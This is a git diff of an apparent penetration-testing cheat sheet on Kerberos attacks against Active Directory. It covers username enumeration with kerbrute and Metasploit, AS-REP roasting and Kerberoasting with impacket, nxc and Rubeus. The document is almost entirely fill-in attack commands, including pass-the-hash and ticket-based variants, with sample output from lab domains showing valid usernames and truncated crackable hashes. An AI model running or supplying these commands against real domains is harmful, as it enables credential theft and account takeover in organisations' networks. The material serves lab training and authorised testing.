@@ -1,17 +1,96 @@
 ---
 title: "Kerberoasting"
-tags: ["Kerberos", "Impacket", "Kerberoasting", "Asreproast", "Rubeus", "Domain Controller", "Active Directory", "Windows", "GetNPUsers"]
+tags: ["Active Directory", "Kerberoasting", "Asreproast", "Domain Controller", "GetNPUsers", "Impacket", "Kerberos", "Rubeus", "Windows"]
+---
+
+{{< filter_buttons >}}
+
+### Users Enum
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active>}}kerbrute{{< /tab >}}{{< tab set1-1 tab2 >}}metasploit{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
+
+```console
+kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE>
+```
+
+```console {class="sample-code"}
+$ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop
+
+2024/09/24 14:54:41 >  Using KDC(s):
+2024/09/24 14:54:41 >   dc.absolute.htb:88
+
+2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.roberts@absolute.htb
+2024/09/24 14:54:41 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
+2024/09/24 14:54:41 >  [+] VALID USERNAME:       s.osvald@absolute.htb
+2024/09/24 14:54:41 >  [+] VALID USERNAME:       d.klay@absolute.htb
+2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.robinson@absolute.htb
+2024/09/24 14:54:41 >  [+] VALID USERNAME:       n.smith@absolute.htb
+2024/09/24 14:54:42 >  Done! Tested 88 usernames (6 valid) in 0.491 seconds
+```
+
+<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1-1 tab2 >}}
+
+```console
+use auxiliary/gather/kerberos_enumusers
+```
+
+```console
+set user_file <USERS_FILE>
+set rhosts <DC>
+set domain <DOMAIN>
+run
+```
+
+```console {class="sample-code"}
+msf6 auxiliary(gather/kerberos_enumusers) > run
+
+[*] Using domain: DANTE - 172.16.2.1:88        ...
+[*] 172.16.2.1 - User: "user1" user not found
+[*] 172.16.2.1 - User: "user2" user not found
+[*] 172.16.2.1 - User: "user3" user not found
+[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ---[SNIP]--- 9161d63be1
+---[SNIP]---
+[*] Auxiliary module execution completed
+```
+
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+```console
+TO-DO
+```
+
+{{< /tabcontent >}}
+
 ---
 
 ### AS_REP Roasting
 
-{{< tab set1 tab1 >}}Impacket{{< /tab >}}
-{{< tab set1 tab2 >}}nxc{{< /tab >}}
-{{< tabcontent set1 tab1 >}}
+{{< tab set2 tab1 >}}Linux{{< /tab >}}
+{{< tab set2 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+{{< tab set2-1 tab1 active>}}impacket{{< /tab >}}{{< tab set2-1 tab2 >}}nxc{{< /tab >}}
+{{< tabcontent set2-1 tab1 >}}
 
 ```console
-# Multiple valid usernames
-impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS> -no-pass -dc-ip <DC_IP>
+# Multiple users
+impacket-GetNPUsers '<DOMAIN>/' -usersfile <USERS> -no-pass -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -27,8 +106,8 @@ $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ---
 ```
 
 ```console
-# Single user without creds
-impacket-GetNPUsers -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>'
+# Single user
+impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -40,10 +119,10 @@ $krb5asrep$23$d.klay@ABSOLUTE.HTB:97c9a3ec7b550c29bc52f0c176738e73$ab25b07d4 ---
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
+{{< tabcontent set2-1 tab2 >}}
 
 ```console
-# Multiple valid usernames
+# Multiple users
 nxc ldap <DC> -u <USERS> -p '' --asreproast as_rep_hashes.txt
 ```
 
@@ -54,45 +133,54 @@ LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUT
 ```
 
 {{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+```console
+TO-DO
+```
+
+{{< /tabcontent >}}
 
 ---
 
-### Kerberoasting (From Linux)
+### Kerberoasting
 
-{{< tab set2 tab1 >}}Impacket{{< /tab >}}
-{{< tab set2 tab2 >}}nxc{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
+{{< tab set3 tab1 >}}Linux{{< /tab >}}
+{{< tab set3 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
+{{< tab set3-1 tab1 >}}impacket{{< /tab >}}{{< tab set3-1 tab2 >}}nxc{{< /tab >}}
+{{< tabcontent set3-1 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
 sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
-```console
-# Kerberos
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -no-pass -k -dc-host <DC>
+```console {class="ntlm"}
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
 ```
 
-```console {class="sample-code"}
-$ sudo ntpdate -s DC1.scrm.local && impacket-GetUserSPNs -request 'scrm.local/ksimpson:ksimpson' -k -dc-host DC1.scrm.local
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
-
-[-] CCache file is not found. Skipping...
-[-] CCache file is not found. Skipping...
-ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------------  ------  --------  --------------------------  --------------------------  ----------
-MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
-MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
-
-[-] CCache file is not found. Skipping...
-$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b62984d5b ---[SNIP]--- f4c2161493
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-host <DC>
 ```
 
-<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-host <DC>
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -k -no-pass -dc-host <DC>
+```
+
+#### Anonymous Kerberoasting
 
 ```console
-# Anonymous
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS> -dc-host <DC> <DOMAIN>/
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/' -usersfile <USERS> -no-preauth <USER_WITH_NO_PREAUTH> -dc-host <DC> 
 ```
 
 ```console {class="sample-code"}
@@ -105,37 +193,44 @@ $krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$d989a5d49 ---[SNIP]--- 962d2aa2f2
 ---[SNIP]---
 ```
 
-{{< /tabcontent >}}
-{{< tabcontent set2 tab2 >}}
-
-```console
-sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s DC1.scrm.local && nxc ldap 10.10.11.168 -u ksimpson -p 'ksimpson' -k --kerberoasting kerberoast_hashes.txt
-LDAP        10.10.11.168    389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
-LDAPS       10.10.11.168    636    DC1.scrm.local   [+] scrm.local\ksimpson 
-LDAPS       10.10.11.168    636    DC1.scrm.local   Bypassing disabled account krbtgt 
-LDAPS       10.10.11.168    636    DC1.scrm.local   [*] Total of records returned 2
-LDAPS       10.10.11.168    636    DC1.scrm.local   sAMAccountName: sqlsvc memberOf:  pwdLastSet: 2021-11-04 00:32:02.351452 lastLogon:2024-09-24 15:53:26.496449
-LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$335aeba3b ---[SNIP]--- 9718487474
-```
-
-```console
-# Socks5
-proxychains4 -q nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt --dns-tcp --dns-server <DC_IP>
-```
+<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>
 
 {{< /tabcontent >}}
+{{< tabcontent set3-1 tab2 >}}
 
-### Kerberoasting (From Windows)
+```console {class="password"}
+# Password
+sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --kerberoasting kerberoast_hashes.txt
+```
 
-{{< tab set3 tab1 >}}rubeus{{< /tab >}}
-{{< tabcontent set3 tab1 >}}
+```console {class="ntlm"}
+# NTLM
+sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -H '<HASH>' -d <DOMAIN> --kerberoasting kerberoast_hashes.txt
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> --kerberoasting kerberoast_hashes.txt
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> --kerberoasting kerberoast_hashes.txt
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> --kerberoasting kerberoast_hashes.txt
+```
+
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
 
 ```console
 .\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>'
 ```
 
 {{< /tabcontent >}}
+
+<br>
